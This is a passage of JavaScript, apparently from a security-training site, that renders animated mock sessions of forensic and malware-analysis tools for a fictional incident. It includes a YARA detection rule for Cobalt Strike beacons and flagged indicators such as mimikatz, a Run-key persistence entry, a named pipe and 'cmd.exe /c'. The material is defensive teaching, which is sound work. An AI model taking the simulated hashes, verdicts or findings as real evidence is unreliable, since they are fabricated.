    procs.forEach((p, i) => {
      timers.later(() => {
        p.classList.remove('pending');
        p.classList.add('hit');
        const name = p.querySelector('.vp-name');
        if (name && /powershell|lsass|svchost/.test(name.textContent)) {
          p.classList.add('flagged');
        }
      }, 3400 + i * 450);
    });

    // malfind appears after windows.malfind (i=3)
    const mfs = host.querySelectorAll('#vol3-malfind .vol-mf-row');
    mfs.forEach((m, i) => {
      timers.later(() => {
        m.classList.remove('pending');
        m.classList.add('hit');
        m.classList.add('flagged');
      }, 6200 + i * 700);
    });

    // verdict flips to MALICIOUS at the end
    timers.later(() => {
      if (verdict) {
        verdict.textContent = '// verdict: MALICIOUS — credential dump in lsass.exe';
        verdict.classList.remove('pending');
        verdict.classList.add('hit','malicious');
      }
    }, 9200);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 4. Disk Forensics (Autopsy) (Intermediate) ----------
 * Visual: AUTOPSY CASE VIEWER — case banner + ingest timeline (chips),
 * then 2-column body: file tree on left (Recent Documents expanded),
 * Prefetch file viewer on right showing powershell.exe @ 02:11:42.
 * Level: intermediate → daily-case workflow.
 */
function buildDiskForensicsAutopsySim(skill, meta, lvl) {
  const visual = `
    <div class="aut-case" id="aut-case">
      <div class="aut-banner">
        <span class="ab-tag">// AUTOPSY CASE</span>
        <span class="ab-name">INC-2025-047</span>
        <span class="ab-meta">examiner: S. Marzouk · created 2025-01-04 02:00 · data source: disk.E01 (256 GB)</span>
      </div>
      <div class="aut-ingest" id="aut-ingest">
        <span class="ai-chip pending" data-i="0">Add Data Source</span>
        <span class="ai-arrow">&rarr;</span>
        <span class="ai-chip pending" data-i="1">Ingest: File Analysis</span>
        <span class="ai-arrow">&rarr;</span>
        <span class="ai-chip pending" data-i="2">Ingest: Hash Lookup (NSRL)</span>
        <span class="ai-arrow">&rarr;</span>
        <span class="ai-chip pending" data-i="3">Ingest: Recent Documents</span>
        <span class="ai-arrow">&rarr;</span>
        <span class="ai-chip pending" data-i="4">Ingest: Prefetch Parser</span>
      </div>
      <div class="aut-cols">
        <div class="aut-tree" id="aut-tree">
          <div class="sim-h">// file tree</div>
          <div class="aut-node pending" data-i="0"><span class="an-tw">&#9654;</span><span class="an-name">C:\Volume01</span></div>
          <div class="aut-node pending" data-i="1" style="margin-left:14px"><span class="an-tw">&#9654;</span><span class="an-name">Users</span></div>
          <div class="aut-node pending" data-i="2" style="margin-left:28px"><span class="an-tw">&#9654;</span><span class="an-name">jdoe</span></div>
          <div class="aut-node pending open" data-i="3" style="margin-left:42px"><span class="an-tw">&#9660;</span><span class="an-name">Recent Documents</span></div>
          <div class="aut-leaf pending flagged" data-i="4" style="margin-left:56px"><span class="an-tw">&#9642;</span><span class="an-name">powershell.lnk</span><span class="an-ts">02:11:42</span></div>
          <div class="aut-leaf pending" data-i="5" style="margin-left:56px"><span class="an-tw">&#9642;</span><span class="an-name">cmd.lnk</span><span class="an-ts">02:12:03</span></div>
          <div class="aut-leaf pending" data-i="6" style="margin-left:56px"><span class="an-tw">&#9642;</span><span class="an-name">mimikatz.lnk</span><span class="an-ts">02:13:18</span><span class="an-flag">!</span></div>
          <div class="aut-node pending" data-i="7" style="margin-left:42px"><span class="an-tw">&#9654;</span><span class="an-name">Desktop</span></div>
          <div class="aut-node pending" data-i="8" style="margin-left:14px"><span class="an-tw">&#9654;</span><span class="an-name">Windows</span></div>
          <div class="aut-node pending open" data-i="9" style="margin-left:28px"><span class="an-tw">&#9660;</span><span class="an-name">Prefetch</span></div>
          <div class="aut-leaf pending flagged" data-i="10" style="margin-left:42px"><span class="an-tw">&#9642;</span><span class="an-name">POWERSHELL.EXE-3C1B.PF</span><span class="an-ts">02:11:42</span></div>
        </div>
        <div class="aut-viewer" id="aut-viewer">
          <div class="sim-h">// prefetch entry viewer</div>
          <div class="aut-meta pending" data-i="0">
            <div class="am-row"><span class="am-k">FILE</span><span class="am-v">POWERSHELL.EXE-3C1B.PF</span></div>
            <div class="am-row"><span class="am-k">PATH</span><span class="am-v">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span></div>
            <div class="am-row"><span class="am-k">LAST RUN</span><span class="am-v flagged">2025-01-04 02:11:42 UTC</span></div>
            <div class="am-row"><span class="am-k">RUN COUNT</span><span class="am-v">8</span></div>
            <div class="am-row"><span class="am-k">VOLUME</span><span class="am-v">C:\Volume01 (serial A1B2-C3D4)</span></div>
            <div class="am-row"><span class="am-k">FILES LOADED</span><span class="am-v">47 (System32 DLLs, CLR, etc.)</span></div>
            <div class="am-row"><span class="am-k">DIRS LOADED</span><span class="am-v">12</span></div>
            <div class="am-row"><span class="am-k">HASH</span><span class="am-v">sha256=4f8c7a13...e201</span></div>
          </div>
          <div class="aut-verdict pending" id="aut-verdict">// IOC match — powershell.exe @ 02:11:42</div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # Disk Forensics — Autopsy @ ${ts()}`,
    `$ # ${lvlLine(lvl,'open')} — ${lvlLine(lvl,'close')}`,
    `$ # Case: INC-2025-047 · examiner: S. Marzouk · evidence: disk.E01 (256 GB)`,
    '$ autopsy --case=INC-2025-047 --add-source=disk.E01 --ingest=all',
    '[*] adding data source disk.E01 (256 GB) …',
    '[ok] raw image verified — md5 a8b3...e44 / sha1 c9d2...f87',
    '[*] running ingest modules:',
    '[ok] File Analysis         4.2M files indexed',
    '[ok] Hash Lookup (NSRL)    3.7M files known-good',
    '[ok] Recent Documents      42 LNK files parsed',
    '[ok] Prefetch Parser       127 PF files parsed',
    '$ # pivot — sort Prefetch by LastRun descending',
    '[!] POWERSHELL.EXE-3C1B.PF   last run 2025-01-04 02:11:42',
    '[!] CMD.EXE-7D2A.PF          last run 2025-01-04 02:12:03',
    '[!] MIMIKATZ.EXE-1F04.PF     last run 2025-01-04 02:13:18',
    '$ # correlate with Recent Documents LNK timestamps',
    '[ok] powershell.lnk → 02:11:42  ← matches Prefetch last run',
    '[ok] cmd.lnk        → 02:12:03  ← matches Prefetch last run',
    '[ok] mimikatz.lnk   → 02:13:18  ← matches Prefetch last run',
    '[!] timeline anchored at 02:11:42 — power-on window for malicious activity',
    '$ # tag the three files as evidence in the case',
    '[ok] 3 evidence items tagged, hash-list exported to /cases/INC-2025-047/evidence.json'
  ];

  function animate(host, timers) {
    const acase = host.querySelector('#aut-case');
    if (!acase) return;
    acase.querySelectorAll('.pending,.running,.hit,.flagged-now').forEach(e => {
      e.classList.remove('running','hit','flagged-now');
      e.classList.add('pending');
    });
    const verdict = host.querySelector('#aut-verdict');
    if (verdict) {
      verdict.textContent = '// IOC match — powershell.exe @ 02:11:42';
      verdict.classList.remove('hit','flagged-now');
      verdict.classList.add('pending');
    }

    // ingest chips
    const chips = host.querySelectorAll('#aut-ingest .ai-chip');
    chips.forEach((c, i) => {
      timers.later(() => {
        c.classList.remove('pending');
        c.classList.add('running');
      }, 300 + i * 700);
      timers.later(() => {
        c.classList.remove('running');
        c.classList.add('hit');
      }, 300 + i * 700 + 500);
    });

    // file tree
    const nodes = host.querySelectorAll('#aut-tree .aut-node, #aut-tree .aut-leaf');
    nodes.forEach((n, i) => {
      timers.later(() => {
        n.classList.remove('pending');
        n.classList.add('hit');
        if (n.classList.contains('flagged')) n.classList.add('flagged-now');
      }, 3900 + i * 320);
    });

    // viewer meta rows
    const metaRows = host.querySelectorAll('#aut-viewer .am-row');
    metaRows.forEach((r, i) => {
      timers.later(() => {
        r.classList.remove('pending');
        r.classList.add('hit');
        if (r.querySelector('.flagged')) r.classList.add('flagged-now');
      }, 7600 + i * 350);
    });

    timers.later(() => {
      if (verdict) {
        verdict.textContent = '// CONFIRMED — IOC match powershell.exe @ 02:11:42 anchors timeline';
        verdict.classList.remove('pending');
        verdict.classList.add('hit','flagged-now');
      }
    }, 11200);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 5. Disk Forensics (FTK Imager) (Beginner) ----------
 * Visual: FTK IMAGER WIZARD — vertical sequential steps with tooltips,
 * showing Add Evidence → Image File → evidence.E01 → hash verify
 * → MD5/SHA1 mismatch on sector 1024.
 * Level: beginner → guided walkthrough with `man`/help tooltips.
 */
function buildDiskForensicsFtkImagerSim(skill, meta, lvl) {
  const visual = `
    <div class="ftk-wizard" id="ftk-wizard">
      <div class="ftk-toolbar">
        <span class="ftk-title">// FTK Imager 4.7.1 — guided acquisition</span>
        <span class="ftk-hint">[beginner] hover any step for tooltip</span>
      </div>
      <div class="ftk-step pending" data-i="0" id="ftk-step-0">
        <span class="fs-no">1</span>
        <span class="fs-body">
          <span class="fs-name">File &rarr; Add Evidence Item</span>
          <span class="fs-tip">choose "Image File" — we will point at a raw E01 image</span>
        </span>
        <span class="fs-state">queued</span>
      </div>
      <div class="ftk-step pending" data-i="1" id="ftk-step-1">
        <span class="fs-no">2</span>
        <span class="fs-body">
          <span class="fs-name">Select Source Type: Image File</span>
          <span class="fs-tip">E01 = Expert Witness Format (encase-style) with embedded hash</span>
        </span>
        <span class="fs-state">queued</span>
      </div>
      <div class="ftk-step pending" data-i="2" id="ftk-step-2">
        <span class="fs-no">3</span>
        <span class="fs-body">
          <span class="fs-name">Browse &rarr; evidence.E01 (4.7 GB)</span>
          <span class="fs-tip">write-blocker verified before mount — read-only access</span>
        </span>
        <span class="fs-state">queued</span>
      </div>
      <div class="ftk-step pending" data-i="3" id="ftk-step-3">
        <span class="fs-no">4</span>
        <span class="fs-body">
          <span class="fs-name">Verify Image — compute MD5 + SHA1</span>
          <span class="fs-tip">FTK re-reads every sector and compares against E01 embedded hashes</span>
        </span>
        <span class="fs-state">queued</span>
      </div>
      <div class="ftk-hash pending" id="ftk-hash">
        <div class="fh-row"><span class="fh-k">EXPECTED MD5</span><span class="fh-v ok">a8b3c2d1...e44</span></div>
        <div class="fh-row"><span class="fh-k">COMPUTED MD5</span><span class="fh-v pending" id="ftk-md5">computing…</span></div>
        <div class="fh-row"><span class="fh-k">EXPECTED SHA1</span><span class="fh-v ok">c9d2e1f0...f87</span></div>
        <div class="fh-row"><span class="fh-k">COMPUTED SHA1</span><span class="fh-v pending" id="ftk-sha1">computing…</span></div>
        <div class="fh-row"><span class="fh-k">SECTOR 1024</span><span class="fh-v pending" id="ftk-sec">verifying…</span></div>
      </div>
      <div class="ftk-mismatch pending" id="ftk-mismatch">
        <span class="fm-tag">// HASH MISMATCH</span>
        <span class="fm-text">MD5/SHA1 mismatch on sector 1024 — evidence image may be tampered</span>
      </div>
    </div>
  `;
  const lines = [
    `$ # Disk Forensics — FTK Imager @ ${ts()} — beginner walkthrough`,
    `$ # ${lvlLine(lvl,'open')} — ${lvlLine(lvl,'close')}`,
    `$ man ftk-imager`,
    '[doc] FTK Imager — create + verify forensic images, mount as read-only',
    '$ # Step 1: open FTK Imager and add the evidence item',
    '$ ftk-imager --add=evidence.E01',
    '[ok] write-blocker active on /dev/sdb — read-only access',
    '$ # Step 2: select source type "Image File" then browse to evidence.E01',
    '[ok] evidence.E01 (4.7 GB) loaded — Expert Witness Format',
    '$ # Step 3: verify the image (re-read + recompute hashes)',
    '$ ftk-imager --verify=evidence.E01',
    '[*] computing MD5 over 4.7 GB …',
    '[*] computing SHA1 over 4.7 GB …',
    '[warn] sector 1024 read differs from E01 embedded hash',
    '[!] computed MD5   = 9f3e2a1b...c88  (expected a8b3c2d1...e44)',
    '[!] computed SHA1  = 7c4b3c2d...a91  (expected c9d2e1f0...f87)',
    '[!] hash mismatch on sector 1024 — image may have been tampered post-acquisition',
    '$ # Step 4: document the discrepancy and re-acquire from source',
    '[ok] discrepancy logged in chain-of-custody for INC-2025-047',
    '$ # Step 5: re-acquire from original disk under a fresh write-blocker',
    '[ok] new image evidence_v2.E01 — md5 verified, sha1 verified',
    '$ # ready to progress to intermediate workflows — independent image handling'
  ];

  function animate(host, timers) {
    const wiz = host.querySelector('#ftk-wizard');
    if (!wiz) return;
    wiz.querySelectorAll('.pending,.running,.hit,.mismatch-now').forEach(e => {
      e.classList.remove('running','hit','mismatch-now');
      e.classList.add('pending');
    });
    const md5 = host.querySelector('#ftk-md5');
    const sha1 = host.querySelector('#ftk-sha1');
    const sec = host.querySelector('#ftk-sec');
    const mm = host.querySelector('#ftk-mismatch');
    if (md5) { md5.textContent = 'computing…'; md5.className = 'fh-v pending'; }
    if (sha1) { sha1.textContent = 'computing…'; sha1.className = 'fh-v pending'; }
    if (sec) { sec.textContent = 'verifying…'; sec.className = 'fh-v pending'; }
    if (mm) {
      mm.querySelector('.fm-text').textContent = 'MD5/SHA1 mismatch on sector 1024 — evidence image may be tampered';
      mm.classList.remove('hit','mismatch-now'); mm.classList.add('pending');
    }

    const steps = host.querySelectorAll('#ftk-wizard .ftk-step');
    steps.forEach((s, i) => {
      timers.later(() => {
        s.classList.remove('pending');
        s.classList.add('running');
        s.querySelector('.fs-state').textContent = 'running';
      }, 400 + i * 1500);
      timers.later(() => {
        s.classList.remove('running');
        s.classList.add('hit');
        s.querySelector('.fs-state').textContent = 'done';
      }, 400 + i * 1500 + 1100);
    });

    // hash panel reveals after step 3 (i=3 starts at 400+3*1500=4900)
    timers.later(() => {
      if (host.querySelector('#ftk-hash')) host.querySelector('#ftk-hash').classList.remove('pending');
    }, 4900);

    // md5 mismatch progress
    const md5Ticks = ['9f3e2a1b','9f3e2a1b...c8','9f3e2a1b...c88'];
    md5Ticks.forEach((t, i) => {
      timers.later(() => {
        if (md5) { md5.textContent = t; md5.className = 'fh-v warn'; }
      }, 5500 + i * 700);
    });
    timers.later(() => { if (md5) { md5.textContent = '9f3e2a1b...c88'; md5.className = 'fh-v crit'; } }, 7600);

    const sha1Ticks = ['7c4b3c2d','7c4b3c2d...a9','7c4b3c2d...a91'];
    sha1Ticks.forEach((t, i) => {
      timers.later(() => {
        if (sha1) { sha1.textContent = t; sha1.className = 'fh-v warn'; }
      }, 6100 + i * 700);
    });
    timers.later(() => { if (sha1) { sha1.textContent = '7c4b3c2d...a91'; sha1.className = 'fh-v crit'; } }, 8200);

    const secTicks = ['verifying','sector 1024 differs','MISMATCH'];
    secTicks.forEach((t, i) => {
      timers.later(() => {
        if (sec) { sec.textContent = t; sec.className = i === 2 ? 'fh-v crit' : 'fh-v warn'; }
      }, 6700 + i * 700);
    });
    timers.later(() => { if (sec) { sec.textContent = 'MISMATCH'; sec.className = 'fh-v crit'; } }, 8800);

    // final mismatch banner
    timers.later(() => {
      if (mm) {
        mm.classList.remove('pending');
        mm.classList.add('hit','mismatch-now');
      }
    }, 9800);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 6. Malware Analysis (YARA) (Intermediate) ----------
 * Visual: YARA RULE EDITOR on left (rule typed out line-by-line),
 * scan results panel on right showing 3/247 binaries flagged.
 * Level: intermediate → daily rule authoring + scan workflow.
 */
function buildMalwareAnalysisYaraSim(skill, meta, lvl) {
  const visual = `
    <div class="yara-grid" id="yara-grid">
      <div class="yara-editor" id="yara-editor">
        <div class="sim-h">// yara rule editor — cobaltstrike_beacon.yar</div>
        <pre class="yara-code" id="yara-code"></pre>
      </div>
      <div class="yara-scan" id="yara-scan">
        <div class="sim-h">// scan results — /samples (247 binaries)</div>
        <div class="ys-stats">
          <div class="ys-stat"><span class="yss-lbl">scanned</span><span class="yss-val" id="yara-scanned">0</span></div>
          <div class="ys-stat"><span class="yss-lbl">flagged</span><span class="yss-val warn" id="yara-flagged">0</span></div>
          <div class="ys-stat"><span class="yss-lbl">clean</span><span class="yss-val ok" id="yara-clean">0</span></div>
        </div>
        <div class="ys-rows" id="yara-rows"></div>
      </div>
    </div>
  `;
  // The real YARA rule text we'll "type out"
  const ruleText = [
    'rule CobaltStrike_Beacon_x64 {',
    '    meta:',
    '        author      = "S. Marzouk"',
    '        date        = "2025-01-04"',
    '        description = "Cobalt Strike beacon x64 detection"',
    '        reference   = "ATT&CK T1071.004"',
    '    strings:',
    '        $a1 = "%%.s" ascii',
    '        $a2 = { 55 8B EC 83 EC 18 53 56 57 8B F9 E8 }',
    '        $a3 = "ReflectiveLoader" ascii',
    '        $a4 = /post-ex\\x2f[0-9a-f]{8}/ ascii',
    '    condition:',
    '        uint16(0) == 0x5a4d and',
    '        filesize < 300KB and',
    '        $a1 and $a2 and ($a3 or $a4',
    '}'
  ].join('\n');

  const lines = [
    `$ # Malware Analysis — YARA @ ${ts()}`,
    `$ # ${lvlLine(lvl,'open')} — ${lvlLine(lvl,'close')}`,
    `$ # Rule: cobaltstrike_beacon.yar  · target dir: /samples (247 binaries)`,
    '$ cat cobaltstrike_beacon.yar',
    'rule CobaltStrike_Beacon_x64 {',
    '    meta:',
    '        author      = "S. Marzouk"',
    '        date        = "2025-01-04"',
    '        reference   = "ATT&CK T1071.004"',
    '    strings:',
    '        $a1 = "%%.s" ascii',
    '        $a2 = { 55 8B EC 83 EC 18 53 56 57 8B F9 E8 }',
    '        $a3 = "ReflectiveLoader" ascii',
    '        $a4 = /post-ex\\x2f[0-9a-f]{8}/ ascii',
    '    condition:',
    '        uint16(0) == 0x5a4d and filesize < 300KB',
    '        and $a1 and $a2 and ($a3 or $a4)',
    '}',
    '$ # validate rule syntax before scanning',
    '$ yara -d cobaltstrike_beacon.yar __testfile__',
    '[ok] rule syntax OK — no warnings',
    '$ # scan the entire samples folder',
    '$ yara -r cobaltstrike_beacon.yar /samples',
    '[+] /samples/beacon_x64_v3.exe       CobaltStrike_Beacon_x64',
    '[+] /samples/svchost_patched.dll     CobaltStrike_Beacon_x64',
    '[+] /samples/loader_packed.exe       CobaltStrike_Beacon_x64',
    '[ok] 3 of 247 binaries flagged (1.2%)',
    '$ # triage — hash + VT lookup the 3 hits',
    '$ sha256sum /samples/beacon_x64_v3.exe',
    '[ok] 4f8c7a13...e201 → VT 47/72 (Cobalt Strike beacon x64 v3)',
    '$ sha256sum /samples/svchost_patched.dll',
    '[ok] 1a2b3c4d...9f8a → VT 39/72 (variant, same family)',
    '$ sha256sum /samples/loader_packed.exe',
    '[ok] c0d4e3b1...77ab → VT 0/72 (novel — submit to sandbox)',
    '[ok] rule validated — added to team rule pack for next deploy'
  ];

  function animate(host, timers) {
    const grid = host.querySelector('#yara-grid');
    if (!grid) return;
    const code = host.querySelector('#yara-code');
    const scanned = host.querySelector('#yara-scanned');
    const flagged = host.querySelector('#yara-flagged');
    const clean = host.querySelector('#yara-clean');
    const rows = host.querySelector('#yara-rows');
    if (code) code.textContent = '';
    if (scanned) scanned.textContent = '0';
    if (flagged) flagged.textContent = '0';
    if (clean) clean.textContent = '0';
    if (rows) rows.innerHTML = '';

    // type out rule line by line
    const linesArr = ruleText.split('\n');
    linesArr.forEach((ln, i) => {
      timers.later(() => {
        if (code) code.textContent += (i ? '\n' : '') + ln;
      }, 300 + i * 380);
    });

    // scan starts after rule is typed
    const scanStart = 300 + linesArr.length * 380 + 600;
    const hits = [
      { path: '/samples/beacon_x64_v3.exe',  hit: true,  fam: 'CobaltStrike_Beacon_x64' },
      { path: '/samples/svchost.dll',          hit: false, fam: '—' },
      { path: '/samples/svchost_patched.dll', hit: true,  fam: 'CobaltStrike_Beacon_x64' },
      { path: '/samples/loader_packed.exe',   hit: true,  fam: 'CobaltStrike_Beacon_x64' },
      { path: '/samples/chrome_helper.exe',   hit: false, fam: '—' },
      { path: '/samples/update_agent.exe',    hit: false, fam: '—' },
      { path: '/samples/notepad.exe',         hit: false, fam: '—' },
      { path: '/samples/7z.dll',               hit: false, fam: '—' }
    ];
    let totalScanned = 0, totalFlagged = 0;
    // each row appears every 600ms, with 247/8 ratio => simulate "247 scanned" counter
    const stepScanned = Math.ceil(247 / hits.length);
    hits.forEach((h, i) => {
      timers.later(() => {
        totalScanned += stepScanned;
        if (h.hit) totalFlagged++;
        if (scanned) scanned.textContent = Math.min(247, totalScanned);
        if (flagged) flagged.textContent = totalFlagged;
        if (clean)   clean.textContent = Math.max(0, Math.min(247, totalScanned) - totalFlagged);
        if (rows) {
          const r = document.createElement('div');
          r.className = 'ys-row ' + (h.hit ? 'hit' : 'clean');
          r.innerHTML = `<span class="ys-path">${h.path}</span><span class="ys-fam">${h.fam}</span>`;
          rows.appendChild(r);
          while (rows.children.length > 6) rows.removeChild(rows.firstChild);
        }
      }, scanStart + i * 800);
    });
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 7. Malware Analysis (PEStudio) (Beginner) ----------
 * Visual: PESTUDIO UI MOCK — top toolbar with file metadata, then 3
 * tab panels (Imports | Sections | Strings), verdict banner at bottom.
 * Level: beginner → guided tooltips on each panel.
 */
function buildMalwareAnalysisPEStudioSim(skill, meta, lvl) {
  const visual = `
    <div class="pes-grid" id="pes-grid">
      <div class="pes-toolbar">
        <span class="pt-file">// sample.exe (4.2 KB, sha256 4f8c7a13...e201)</span>
        <span class="pt-hint">[beginner] follow the tooltips through the tabs</span>
      </div>
      <div class="pes-meta" id="pes-meta">
        <div class="pm-row"><span class="pm-k">FILE</span><span class="pm-v">sample.exe</span></div>
        <div class="pm-row"><span class="pm-k">SIZE</span><span class="pm-v">4.2 KB</span></div>
        <div class="pm-row"><span class="pm-k">COMPILED</span><span class="pm-v">2024-12-31 23:58 (suspicious timestamp)</span></div>
        <div class="pm-row"><span class="pm-k">SUBSYSTEM</span><span class="pm-v">WINDOWS_CUI (console)</span></div>
        <div class="pm-row"><span class="pm-k">ENTROPY</span><span class="pm-v" id="pes-ent-val">computing…</span></div>
      </div>
      <div class="pes-tabs">
        <div class="pes-tab pending" data-i="0" id="pes-tab-0">
          <span class="pes-tab-name">// IMPORTS</span>
          <span class="pes-tab-tip">what DLLs + APIs the binary depends on</span>
        </div>
        <div class="pes-tab pending" data-i="1" id="pes-tab-1">
          <span class="pes-tab-name">// SECTIONS</span>
          <span class="pes-tab-tip">code/data segments + entropy per section</span>
        </div>
        <div class="pes-tab pending" data-i="2" id="pes-tab-2">
          <span class="pes-tab-name">// STRINGS</span>
          <span class="pes-tab-tip">ASCII/UTF-8 — flagged against blacklist</span>
        </div>
      </div>
      <div class="pes-body" id="pes-body">
        <div class="pes-imp pending" id="pes-imp">
          <div class="pi-row"><span class="pi-dll">kernel32.dll</span><span class="pi-api">LoadLibraryA, GetProcAddress, VirtualAllocEx</span></div>
          <div class="pi-row"><span class="pi-dll">advapi32.dll</span><span class="pi-api">OpenProcessToken, LookupPrivilegeValueA, AdjustTokenPrivileges</span></div>
          <div class="pi-row"><span class="pi-dll">ws2_32.dll</span><span class="pi-api">WSAStartup, socket, connect, send, recv</span></div>
          <div class="pi-row"><span class="pi-dll">ntdll.dll</span><span class="pi-api flagged">NtSetInformationThread (hide from debugger)</span></div>
        </div>
        <div class="pes-sec pending" id="pes-sec">
          <div class="ps-row"><span class="ps-name">.text</span><span class="ps-raw">2.1 KB</span><span class="ps-ent">7.84</span><span class="ps-flag">HIGH</span></div>
          <div class="ps-row"><span class="ps-name">.data</span><span class="ps-raw">0.4 KB</span><span class="ps-ent">5.21</span><span class="ps-flag">normal</span></div>
          <div class="ps-row"><span class="ps-name">.rdata</span><span class="ps-raw">0.7 KB</span><span class="ps-ent">6.04</span><span class="ps-flag">normal</span></div>
          <div class="ps-row"><span class="ps-name">.rsrc</span><span class="ps-raw">0.5 KB</span><span class="ps-ent">3.91</span><span class="ps-flag">normal</span></div>
          <div class="ps-bar"><span class="ps-bar-fill" id="pes-ent-bar" style="width:0%"></span></div>
        </div>
        <div class="pes-str pending" id="pes-str">
          <div class="ps-str-row flagged"><span class="ps-str-v">IsDebuggerPresent</span><span class="ps-str-tag">anti-debug</span></div>
          <div class="ps-str-row flagged"><span class="ps-str-v">ImportNTDLL</span><span class="ps-str-tag">import anomaly</span></div>
          <div class="ps-str-row flagged"><span class="ps-str-v">cmd.exe /c</span><span class="ps-str-tag">shell exec</span></div>
          <div class="ps-str-row flagged"><span class="ps-str-v">\\.\pipe\abc</span><span class="ps-str-tag">named pipe (C2)</span></div>
        </div>
      </div>
      <div class="pes-verdict pending" id="pes-verdict">
        <span class="pv-tag">// VERDICT</span>
        <span class="pv-text">awaiting panel review…</span>
      </div>
    </div>
  `;
  const lines = [
    `$ # Malware Analysis — PEStudio @ ${ts()} — beginner walkthrough`,
    `$ # ${lvlLine(lvl,'open')} — ${lvlLine(lvl,'close')}`,
    `$ # Sample: sample.exe (4.2 KB, sha256=4f8c7a13...e201)`,
    '$ pestudio --file=sample.exe --verbose',
    '[doc] PEStudio — static analysis of PE binaries, identifies anomalies',
    '$ # Tab 1 — Imports',
    '[ok] kernel32.dll   LoadLibraryA, GetProcAddress, VirtualAllocEx',
    '[ok] advapi32.dll   OpenProcessToken, LookupPrivilegeValueA, AdjustTokenPrivileges',
    '[ok] ws2_32.dll     WSAStartup, socket, connect, send, recv  (network IO)',
    '[!] ntdll.dll       NtSetInformationThread  (anti-debug — hide thread)',
    '$ # Tab 2 — Sections',
    '[!] .text  entropy 7.84  HIGH  (likely packed / encrypted payload)',
    '[ok] .data  entropy 5.21  normal',
    '[ok] .rdata entropy 6.04  normal',
    '$ # Tab 3 — Strings (blacklist filter)',
    '[!] IsDebuggerPresent   anti-debug',
    '[!] ImportNTDLL         import anomaly',
    '[!] cmd.exe /c          shell exec',
    '[!] \\\\.\\pipe\\abc         named pipe (C2 channel)',
    '$ # Compute overall verdict',
    '[!] anti-debug + high-entropy .text + named-pipe string = MALICIOUS',
    '[ok] sample.exe flagged MALICIOUS (confidence 94.7%)',
    '$ # Submit to sandbox for dynamic confirmation',
    '[ok] cuckoo sandbox job queued — result pending',
    '$ # ready to progress to intermediate workflows — multi-sample triage'
  ];

  function animate(host, timers) {
    const grid = host.querySelector('#pes-grid');
    if (!grid) return;
    grid.querySelectorAll('.pending,.running,.hit,.malicious-now').forEach(e => {
      e.classList.remove('running','hit','malicious-now');
      e.classList.add('pending');
    });
    const verdict = host.querySelector('#pes-verdict .pv-text');
    const verdictBox = host.querySelector('#pes-verdict');
    if (verdict) verdict.textContent = 'awaiting panel review…';
    if (verdictBox) { verdictBox.classList.remove('hit','malicious-now'); verdictBox.classList.add('pending'); }
    const entVal = host.querySelector('#pes-ent-val');
    const entBar = host.querySelector('#pes-ent-bar');
    if (entVal) entVal.textContent = 'computing…';
    if (entBar) entBar.style.width = '0%';

    // metadata reveals first
    timers.later(() => {
      const m = host.querySelector('#pes-meta');
      if (m) m.classList.remove('pending');
      m.querySelectorAll('.pm-row').forEach(r => r.classList.add('hit'));
    }, 400);

    // entropy meter animates up to 7.84 (full-scale = 8.0 → 98%)
    for (let k = 1; k <= 8; k++) {
      timers.later(() => {
        if (entVal) entVal.textContent = (7.84 * k / 8).toFixed(2);
        if (entBar) entBar.style.width = (98 * k / 8) + '%';
      }, 1200 + k * 220);
    }
    timers.later(() => {
      if (entVal) { entVal.textContent = '7.84 HIGH'; entVal.classList.add('flagged'); }
      if (entBar) entBar.style.width = '98%';
    }, 2960);

    // Tabs activate sequentially
    const tabs = [
      { tab: '#pes-tab-0', body: '#pes-imp' },
      { tab: '#pes-tab-1', body: '#pes-sec' },
      { tab: '#pes-tab-2', body: '#pes-str' }
    ];
    tabs.forEach((t, i) => {
      timers.later(() => {
        const tabEl = host.querySelector(t.tab);
        if (tabEl) { tabEl.classList.remove('pending'); tabEl.classList.add('running'); }
        host.querySelectorAll('.pes-body > div').forEach(b => b.style.display = 'none');
        const body = host.querySelector(t.body);
        if (body) { body.style.display = ''; body.classList.remove('pending'); body.classList.add('hit'); }
      }, 3400 + i * 2200);
      timers.later(() => {
        const tabEl = host.querySelector(t.tab);
        if (tabEl) { tabEl.classList.remove('running'); tabEl.classList.add('hit'); }
      }, 3400 + i * 2200 + 1800);
    });

    // final verdict
    timers.later(() => {
      if (verdict) verdict.textContent = 'MALICIOUS — anti-debug + high-entropy .text + named-pipe string (94.7%)';
      if (verdictBox) { verdictBox.classList.remove('pending'); verdictBox.classList.add('hit','malicious-now'); }
    }, 10800);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 8. Process Analysis (Procmon) (Intermediate) ----------
 * Visual: PROCMON FILTER BAR on top, event log table below — events
 * stream in (RegSetValue, WriteFile, CreateFile) with the Run-key
 * RegSetValue event flagged.
 * Level: intermediate → daily triage with filter + highlight.
 */
function buildProcessAnalysisProcmonSim(skill, meta, lvl) {
  const visual = `
    <div class="pm-bar" id="pm-bar">
      <span class="pm-filt-label">// FILTER</span>
      <span class="pm-filt-chip pending" data-i="0">Process Name is powershell.exe</span>
      <span class="pm-filt-chip pending" data-i="1">Operation is RegSetValue</span>
      <span class="pm-filt-chip pending" data-i="2">Include</span>
      <span class="pm-filt-add pending" data-i="3">+ add filter</span>
    </div>
    <div class="pm-events" id="pm-events">
      <div class="pm-head">
        <span class="pm-c-time">TIME</span>
        <span class="pm-c-proc">PROCESS</span>
        <span class="pm-c-pid">PID</span>
        <span class="pm-c-op">OPERATION</span>
        <span class="pm-c-path">PATH</span>
        <span class="pm-c-res">RESULT</span>
      </div>
      <div class="pm-body" id="pm-body"></div>
    </div>
  `;
  // event stream — powerShell.exe writing to Run key, dropping stage.exe, opening pipe
  const evts = [
    { t: '02:11:42.314', p: 'powershell.exe', pid: '4812', op: 'RegSetValue', path: 'HKCU\\...\\Run\\Updater', res: 'SUCCESS', flag: true },
    { t: '02:11:42.498', p: 'powershell.exe', pid: '4812', op: 'WriteFile',   path: 'C:\\Users\\Public\\stage.exe', res: 'SUCCESS', flag: false },
    { t: '02:11:42.617', p: 'powershell.exe', pid: '4812', op: 'CreateFile',  path: '\\\\.\\pipe\\abc',             res: 'SUCCESS', flag: false },
    { t: '02:11:42.731', p: 'powershell.exe', pid: '4812', op: 'RegQueryValue',path: 'HKLM\\...\\CurrentVersion\\Run', res: 'NOT FOUND', flag: false },
